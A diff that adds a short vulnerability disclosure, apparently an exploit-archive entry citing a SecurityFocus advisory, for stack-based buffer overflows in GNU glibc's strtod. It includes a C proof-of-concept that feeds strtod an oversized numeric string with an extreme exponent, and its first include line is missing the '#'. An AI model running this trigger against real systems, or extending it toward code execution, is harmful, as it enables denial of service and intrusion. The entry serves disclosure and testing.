@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/54982/info
+
+GNU glibc is prone to multiple stack-based buffer-overflow vulnerabilities because it fails to perform adequate boundary checks on user-supplied data.
+
+Local attackers can exploit these issues to run arbitrary code with privileges of the affected application. Failed exploit attempts can result in a denial-of-service condition. 
+
+include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define EXPONENT "e-2147483649"
+#define SIZE 214748364
+int
+main (void)
+{
+  char *p = malloc (1 + SIZE + sizeof (EXPONENT));
+  if (p == NULL)
+    {
+      perror ("malloc");
+      exit (EXIT_FAILURE);
+    }
+  p[0] = '1';
+  memset (p + 1, '0', SIZE);
+  memcpy (p + 1 + SIZE, EXPONENT, sizeof (EXPONENT));
+  double d = strtod (p, NULL);
+  printf ("%a\n", d);
+  exit (EXIT_SUCCESS);
+}
